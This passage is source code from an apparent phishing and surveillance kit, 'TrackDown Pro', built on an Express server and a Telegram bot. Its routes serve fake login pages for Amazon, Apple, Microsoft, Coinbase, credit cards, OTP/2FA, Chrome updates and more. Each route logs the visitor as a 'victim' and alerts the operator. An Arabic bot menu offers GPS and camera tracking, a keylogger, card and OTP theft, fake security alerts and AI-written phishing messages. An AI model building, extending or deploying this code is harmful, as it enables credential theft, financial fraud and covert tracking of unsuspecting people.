var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}

if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'Custom');
  let vpnTag = vpn.isVPN ? '🔴 VPN' : '🟢 Real';
  sendLinkNotification(parseInt(req.params.path,36), 'Custom Form', ip, vpn.city+', '+vpn.country, d);
  res.render("custom",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else {
  res.redirect("https://t.me/th30neand0nly0ne");
}
});

// Amazon Template
app.get("/am/:path/:uri", async (req,res)=>{
var ip; var d = new Date(); d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'Amazon');
  let vpnTag = vpn.isVPN ? '🔴 VPN' : '🟢 Real';
  sendLinkNotification(parseInt(req.params.path,36), 'Amazon', ip, vpn.city+', '+vpn.country, d);
  res.render("amazon",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else { res.redirect("https://t.me/th30neand0nly0ne"); }
});

// Apple Template
app.get("/ap/:path/:uri", async (req,res)=>{
var ip; var d = new Date(); d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'Apple');
  let vpnTag = vpn.isVPN ? '🔴 VPN' : '🟢 Real';
  sendLinkNotification(parseInt(req.params.path,36), 'Apple ID', ip, vpn.city+', '+vpn.country, d);
  res.render("apple",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else { res.redirect("https://t.me/th30neand0nly0ne"); }
});

// Microsoft Template
app.get("/ms/:path/:uri", async (req,res)=>{
var ip; var d = new Date(); d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'Microsoft');
  let vpnTag = vpn.isVPN ? '🔴 VPN' : '🟢 Real';
  sendLinkNotification(parseInt(req.params.path,36), 'Microsoft', ip, vpn.city+', '+vpn.country, d);
  res.render("microsoft",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else { res.redirect("https://t.me/th30neand0nly0ne"); }
});

// LinkedIn Template
app.get("/li/:path/:uri", async (req,res)=>{
var ip; var d = new Date(); d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'LinkedIn');
  let vpnTag = vpn.isVPN ? '🔴 VPN' : '🟢 Real';
  sendLinkNotification(parseInt(req.params.path,36), 'LinkedIn', ip, vpn.city+', '+vpn.country, d);
  res.render("linkedin",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else { res.redirect("https://t.me/th30neand0nly0ne"); }
});

// Twitter/X Template
app.get("/tw/:path/:uri", async (req,res)=>{
var ip; var d = new Date(); d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'Twitter/X');
  let vpnTag = vpn.isVPN ? '🔴 VPN' : '🟢 Real';
  sendLinkNotification(parseInt(req.params.path,36), 'X (Twitter)', ip, vpn.city+', '+vpn.country, d);
  res.render("twitter",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else { res.redirect("https://t.me/th30neand0nly0ne"); }
});

// Telegram Template
app.get("/tg/:path/:uri", async (req,res)=>{
var ip; var d = new Date(); d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'Telegram');
  let vpnTag = vpn.isVPN ? '🔴 VPN' : '🟢 Real';
  sendLinkNotification(parseInt(req.params.path,36), 'Telegram', ip, vpn.city+', '+vpn.country, d);
  res.render("telegram",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else { res.redirect("https://t.me/th30neand0nly0ne"); }
});

// Steam Template
app.get("/st/:path/:uri", async (req,res)=>{
var ip; var d = new Date(); d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'Steam');
  let vpnTag = vpn.isVPN ? '🔴 VPN' : '🟢 Real';
  sendLinkNotification(parseInt(req.params.path,36), 'Steam', ip, vpn.city+', '+vpn.country, d);
  res.render("steam",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else { res.redirect("https://t.me/th30neand0nly0ne"); }
});

// Epic Games Template
app.get("/ep/:path/:uri", async (req,res)=>{
var ip; var d = new Date(); d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'Epic Games');
  let vpnTag = vpn.isVPN ? '🔴 VPN' : '🟢 Real';
  sendLinkNotification(parseInt(req.params.path,36), 'Epic Games', ip, vpn.city+', '+vpn.country, d);
  res.render("epic",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else { res.redirect("https://t.me/th30neand0nly0ne"); }
});

// Credit Card Template
app.get("/cc/:path/:uri", async (req,res)=>{
var ip; var d = new Date(); d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'Credit Card');
  let vpnTag = vpn.isVPN ? '🔴 VPN' : '🟢 Real';
  sendLinkNotification(parseInt(req.params.path,36), 'Credit Card', ip, vpn.city+', '+vpn.country, d);
  res.render("card",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else { res.redirect("https://t.me/th30neand0nly0ne"); }
});

// OTP/2FA Template
app.get("/otp/:path/:uri", async (req,res)=>{
var ip; var d = new Date(); d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'OTP/2FA');
  let vpnTag = vpn.isVPN ? '🔴 VPN' : '🟢 Real';
  sendLinkNotification(parseInt(req.params.path,36), 'OTP/2FA', ip, vpn.city+', '+vpn.country, d);
  res.render("otp",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else { res.redirect("https://t.me/th30neand0nly0ne"); }
});

// Fake Chat Support Template
app.get("/chat/:path/:uri", async (req,res)=>{
var ip; var d = new Date(); d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'Fake Chat');
  let vpnTag = vpn.isVPN ? '🔴 VPN' : '🟢 Real';
  sendLinkNotification(parseInt(req.params.path,36), 'Fake Chat', ip, vpn.city+', '+vpn.country, d);
  res.render("chat",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else { res.redirect("https://t.me/th30neand0nly0ne"); }
});

// Spin Game Template
app.get("/game/:path/:uri", async (req,res)=>{
var ip; var d = new Date(); d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'Spin Game');
  let vpnTag = vpn.isVPN ? '🔴 VPN' : '🟢 Real';
  sendLinkNotification(parseInt(req.params.path,36), 'Spin Game', ip, vpn.city+', '+vpn.country, d);
  res.render("game",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else { res.redirect("https://t.me/th30neand0nly0ne"); }
});

// CAPTCHA Template
app.get("/cap/:path/:uri", async (req,res)=>{
var ip; var d = new Date(); d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'CAPTCHA');
  sendLinkNotification(parseInt(req.params.path,36), 'CAPTCHA', ip, vpn.city+', '+vpn.country, d);
  res.render("captcha",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else { res.redirect("https://t.me/th30neand0nly0ne"); }
});

// Chrome Update Template
app.get("/chu/:path/:uri", async (req,res)=>{
var ip; var d = new Date(); d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'Chrome Update');
  sendLinkNotification(parseInt(req.params.path,36), 'Chrome Update', ip, vpn.city+', '+vpn.country, d);
  res.render("chrome_update",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else { res.redirect("https://t.me/th30neand0nly0ne"); }
});

// WiFi Portal Template
app.get("/wifi/:path/:uri", async (req,res)=>{
var ip; var d = new Date(); d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'WiFi Portal');
  sendLinkNotification(parseInt(req.params.path,36), 'WiFi Portal', ip, vpn.city+', '+vpn.country, d);
  res.render("wifi_portal",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else { res.redirect("https://t.me/th30neand0nly0ne"); }
});

// File Download Template
app.get("/dl/:path/:uri", async (req,res)=>{
var ip; var d = new Date(); d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'File Download');
  sendLinkNotification(parseInt(req.params.path,36), 'File Download', ip, vpn.city+', '+vpn.country, d);
  res.render("file_download",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else { res.redirect("https://t.me/th30neand0nly0ne"); }
});

// Error 404 Template
app.get("/e404/:path/:uri", async (req,res)=>{
var ip; var d = new Date(); d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, '404 Page');
  sendLinkNotification(parseInt(req.params.path,36), '404 Page', ip, vpn.city+', '+vpn.country, d);
  res.render("error404",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else { res.redirect("https://t.me/th30neand0nly0ne"); }
});

// Survey Template
app.get("/srv/:path/:uri", async (req,res)=>{
var ip; var d = new Date(); d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'Survey');
  sendLinkNotification(parseInt(req.params.path,36), 'Survey', ip, vpn.city+', '+vpn.country, d);
  res.render("survey",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else { res.redirect("https://t.me/th30neand0nly0ne"); }
});

// Zoom Meeting Template
app.get("/zm/:path/:uri", async (req,res)=>{
var ip; var d = new Date(); d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'Zoom');
  sendLinkNotification(parseInt(req.params.path,36), 'Zoom', ip, vpn.city+', '+vpn.country, d);
  res.render("zoom_meeting",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else { res.redirect("https://t.me/th30neand0nly0ne"); }
});

// Dropbox Template
app.get("/db/:path/:uri", async (req,res)=>{
var ip; var d = new Date(); d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'Dropbox');
  sendLinkNotification(parseInt(req.params.path,36), 'Dropbox', ip, vpn.city+', '+vpn.country, d);
  res.render("dropbox",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else { res.redirect("https://t.me/th30neand0nly0ne"); }
});

// iCloud Template
app.get("/ic/:path/:uri", async (req,res)=>{
var ip; var d = new Date(); d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'iCloud');
  sendLinkNotification(parseInt(req.params.path,36), 'iCloud', ip, vpn.city+', '+vpn.country, d);
  res.render("icloud",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else { res.redirect("https://t.me/th30neand0nly0ne"); }
});

// Spotify Template
app.get("/sp/:path/:uri", async (req,res)=>{
var ip; var d = new Date(); d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'Spotify');
  sendLinkNotification(parseInt(req.params.path,36), 'Spotify', ip, vpn.city+', '+vpn.country, d);
  res.render("spotify",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else { res.redirect("https://t.me/th30neand0nly0ne"); }
});

// Roblox Template
app.get("/rb/:path/:uri", async (req,res)=>{
var ip; var d = new Date(); d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'Roblox');
  sendLinkNotification(parseInt(req.params.path,36), 'Roblox', ip, vpn.city+', '+vpn.country, d);
  res.render("roblox",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else { res.redirect("https://t.me/th30neand0nly0ne"); }
});

// Coinbase Template
app.get("/cb/:path/:uri", async (req,res)=>{
var ip; var d = new Date(); d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'Coinbase');
  sendLinkNotification(parseInt(req.params.path,36), 'Coinbase', ip, vpn.city+', '+vpn.country, d);
  res.render("coinbase",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else { res.redirect("https://t.me/th30neand0nly0ne"); }
});

// Yahoo Template
app.get("/yh/:path/:uri", async (req,res)=>{
var ip; var d = new Date(); d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'Yahoo');
  sendLinkNotification(parseInt(req.params.path,36), 'Yahoo', ip, vpn.city+', '+vpn.country, d);
  res.render("yahoo",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else { res.redirect("https://t.me/th30neand0nly0ne"); }
});

// GitHub Template
app.get("/gh/:path/:uri", async (req,res)=>{
var ip; var d = new Date(); d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'GitHub');
  sendLinkNotification(parseInt(req.params.path,36), 'GitHub', ip, vpn.city+', '+vpn.country, d);
  res.render("github",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else { res.redirect("https://t.me/th30neand0nly0ne"); }
});

// Uber Template
app.get("/ub/:path/:uri", async (req,res)=>{
var ip; var d = new Date(); d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'Uber');
  sendLinkNotification(parseInt(req.params.path,36), 'Uber', ip, vpn.city+', '+vpn.country, d);
  res.render("uber",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else { res.redirect("https://t.me/th30neand0nly0ne"); }
});

// Adobe Template
app.get("/ad/:path/:uri", async (req,res)=>{
var ip; var d = new Date(); d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'Adobe');
  sendLinkNotification(parseInt(req.params.path,36), 'Adobe', ip, vpn.city+', '+vpn.country, d);
  res.render("adobe",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else { res.redirect("https://t.me/th30neand0nly0ne"); }
});

// Office 365 Template
app.get("/o365/:path/:uri", async (req,res)=>{
var ip; var d = new Date(); d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'Office365');
  sendLinkNotification(parseInt(req.params.path,36), 'Office365', ip, vpn.city+', '+vpn.country, d);
  res.render("office365",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else { res.redirect("https://t.me/th30neand0nly0ne"); }
});

// Crypto Airdrop Template
app.get("/air/:path/:uri", async (req,res)=>{
var ip; var d = new Date(); d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'Crypto Airdrop');
  sendLinkNotification(parseInt(req.params.path,36), 'Crypto Airdrop', ip, vpn.city+', '+vpn.country, d);
  res.render("crypto_airdrop",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else { res.redirect("https://t.me/th30neand0nly0ne"); }
});

// WhatsApp Gold Template
app.get("/wag/:path/:uri", async (req,res)=>{
var ip; var d = new Date(); d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
if(req.params.path != null){
  const vpn = await saveVictim(req.params.path, ip, 'WhatsApp Gold');
  sendLinkNotification(parseInt(req.params.path,36), 'WhatsApp Gold', ip, vpn.city+', '+vpn.country, d);
  res.render("whatsapp_gold",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} else { res.redirect("https://t.me/th30neand0nly0ne"); }
});

const aiChatMode = new Map();
const aiChatHistory = new Map();
const aiWaitingFor = new Map();

function showMainMenu(chatId, firstName) {
    const m = {
        reply_markup: JSON.stringify({"inline_keyboard":[
            [{text:"➕ إنشاء رابط",callback_data:"crenew"}],
            [{text:"📊 إحصائياتي",callback_data:"mystats"},{text:"📋 الضحايا",callback_data:"myvictims"}],
            [{text:"📈 متقدمة",callback_data:"advanced_stats"},{text:"📤 تصدير",callback_data:"export_csv"}],
            [{text:"💬 رسائل وهمية",callback_data:"fake_msg"},{text:"📧 بريد وهمي",callback_data:"fake_email"}],
            [{text:"📞 مكالمات",callback_data:"spamcalls"},{text:"📱 QR Code",callback_data:"qr_code"}],
            [{text:"📍 GPS مستمر",callback_data:"live_gps"},{text:"🚫 حظر IP",callback_data:"block_ip"}],
            [{text:"📋 تقارير",callback_data:"daily_report"},{text:"📹 الشاشة",callback_data:"screen_record"}],
            [{text:"🔍 بحث ضحية",callback_data:"search_victim"},{text:"📝 ملاحظات",callback_data:"notes_menu"}],
            [{text:"📢 بث",callback_data:"broadcast"},{text:"❓ مساعدة",callback_data:"help"}],
            [{text:"━━━━ 🤖 الذكاء الاصطناعي ━━━━",callback_data:"ai_separator"}],
            [{text:"🌐 فحص IP سريع",callback_data:"ip_lookup"},{text:"🔍 تحليل ضحية AI",callback_data:"ai_analyze"}],
            [{text:"💬 محادثة AI",callback_data:"ai_chat"}],
            [{text:"✍️ رسالة تصيد AI",callback_data:"ai_phish"},{text:"🌐 ترجمة AI",callback_data:"ai_translate"}],
            [{text:"📊 تقرير AI شامل",callback_data:"ai_summarize"},{text:"💡 اقتراحات AI",callback_data:"ai_suggest"}],
            [{text:"✨ إعادة كتابة AI",callback_data:"ai_rewrite"}]
        ]})
    };
    const welcomeMsg = `🎯 <b>TrackDown Pro v7.1</b>

مرحباً <b>${firstName || ''}</b>! 👋

أداة تتبع متقدمة مع <b>45 قالب</b> و <b>200+ ميزة</b>

⚡ <b>الميزات الأساسية:</b>
◽ تتبع GPS مباشر + كاميرا مزدوجة
◽ فيديو + صوت + Keylogger
◽ بصمة المتصفح + WebRTC
◽ سرقة بيانات + بطاقات + OTP

🤖 <b>الذكاء الاصطناعي:</b>
◽ محادثة ذكية مستمرة
◽ تحليل ضحايا + اقتراحات
◽ رسائل تصيد مولّدة بالـ AI
◽ ترجمة + تقارير ذكية

👇 اختر من القائمة:`;
    bot.sendMessage(chatId, welcomeMsg, {parse_mode: "HTML", ...m});
}

bot.on('message', async (msg) => {
const chatId = msg.chat.id;
adminChatIds.add(chatId);

if(msg?.reply_to_message?.text=="🌐 Enter Your URL"){
 createLink(chatId,msg.text); 
}

if(msg?.reply_to_message?.text?.includes("Enter Broadcast Message")){
    broadcast(chatId, msg.text);
}
  
if(msg.text=="/start" || msg.text=="/menu"){
saveBotUser(chatId, msg.chat.username, msg.chat.first_name);
showMainMenu(chatId, msg.chat.first_name);
}
else if(msg.text=="/create"){
createNew(chatId);
}
else if(msg.text=="/help"){
sendHelp(chatId);
}
else if(msg.text=="/stats"){
    sendStats(chatId);
}
else if(msg.text && msg.text.startsWith("/note ")){
    const parts = msg.text.substring(6).split(' ');
    const ip = parts[0];
    const note = parts.slice(1).join(' ');
    if(ip && note){
        const notes = victimNotes.get(chatId) || {};
        notes[ip] = note;
        victimNotes.set(chatId, notes);
        bot.sendMessage(chatId, `📝 تم حفظ الملاحظة على <code>${ip}</code>:\n${note}`, {parse_mode: "HTML"});
    }
}
else if(msg?.reply_to_message?.text?.includes("بحث عن ضحية")){
    const query = msg.text.trim();
    try {
        const result = await pool.query(
            `SELECT * FROM victims WHERE ip LIKE $1 OR country LIKE $1 OR browser LIKE $1 OR device LIKE $1 ORDER BY created_at DESC LIMIT 10`,
            [`%${query}%`]
        );
        if(result.rows.length > 0){
            let txt = `🔍 <b>نتائج البحث (${result.rows.length}):</b>\n\n`;
            result.rows.forEach((v, i) => {
                const cat = victimCategories.get(v.ip) || '';
                const catIcon = cat === 'VIP' ? '⭐' : cat === 'Important' ? '🔴' : '';
                txt += `${i+1}. ${catIcon} <code>${v.ip}</code>\n   📍 ${v.country||'?'}, ${v.city||'?'}\n   📱 ${v.device||'?'}\n\n`;
            });
            bot.sendMessage(chatId, txt, {parse_mode: "HTML"});
        } else {
            bot.sendMessage(chatId, "❌ لم يتم العثور على نتائج", {parse_mode: "HTML"});
        }
    } catch(e){
        bot.sendMessage(chatId, "❌ خطأ في البحث", {parse_mode: "HTML"});
    }
}
});

bot.on('callback_query',async function onCallbackQuery(callbackQuery) {
bot.answerCallbackQuery(callbackQuery.id);
const chatId = callbackQuery.message.chat.id;

if(callbackQuery.data=="back_main"){
    showMainMenu(chatId, callbackQuery.message.chat.first_name);
} else if(callbackQuery.data=="ai_separator"){
} else if(callbackQuery.data=="crenew"){
createNew(chatId);
} else if(callbackQuery.data=="help"){
  sendHelp(chatId);
} else if(callbackQuery.data=="stats"){
    sendStats(chatId);
} else if(callbackQuery.data=="broadcast"){
    bot.sendMessage(chatId, "📢 Enter Broadcast Message", {reply_markup: JSON.stringify({"force_reply": true})});
} else if(callbackQuery.data=="fake_msg"){
    const fakeTypes = {
        inline_keyboard: [
            [{text: "⚠️ تحذير أمني", callback_data: "fake_security"}, {text: "🛡 اختراق", callback_data: "fake_hacked"}],
            [{text: "🔐 تحقق", callback_data: "fake_verify"}, {text: "⏰ جلسة", callback_data: "fake_session"}],
            [{text: "🚨 دخول مشبوه", callback_data: "fake_login_alert"}],
            [{text: "🎉 جائزة", callback_data: "fake_prize"}, {text: "💰 مال", callback_data: "fake_money"}],
            [{text: "🎁 هدية", callback_data: "fake_gift"}, {text: "🏆 فائز", callback_data: "fake_winner"}],
            [{text: "🔄 تحديث", callback_data: "fake_update"}, {text: "📲 تطبيق", callback_data: "fake_app_update"}],
            [{text: "⚡ خطأ", callback_data: "fake_error"}, {text: "🔋 بطارية", callback_data: "fake_battery"}],
            [{text: "💌 رسالة", callback_data: "fake_message"}, {text: "📧 بريد", callback_data: "fake_email_msg"}],
            [{text: "📞 مكالمة", callback_data: "fake_missed_call"}, {text: "💬 واتساب", callback_data: "fake_whatsapp"}],
            [{text: "🏦 بنك", callback_data: "fake_bank_alert"}, {text: "💳 بطاقة", callback_data: "fake_card"}],
            [{text: "💸 تحويل", callback_data: "fake_transfer"}],
            [{text: "✏️ مخصص", callback_data: "fake_custom"}, {text: "❌ إلغاء", callback_data: "fake_clear"}],
            [{text: "🔙 رجوع", callback_data: "back_main"}]
        ]
    };
    bot.sendMessage(chatId, `💬 <b>رسائل وهمية</b>\n\nاختر نوع الرسالة:`, {parse_mode: "HTML", reply_markup: JSON.stringify(fakeTypes)});
} else if(callbackQuery.data=="fake_security"){
    userFakeMsg.set(chatId, {type: "security", title: "⚠️ تنبيه أمني عاجل!", msg: "تم رصد نشاط غير معتاد على حسابك من جهاز غير معروف. يرجى التحقق من هويتك فوراً لحماية بياناتك.", icon: "🔒", color: "#dc3545"});
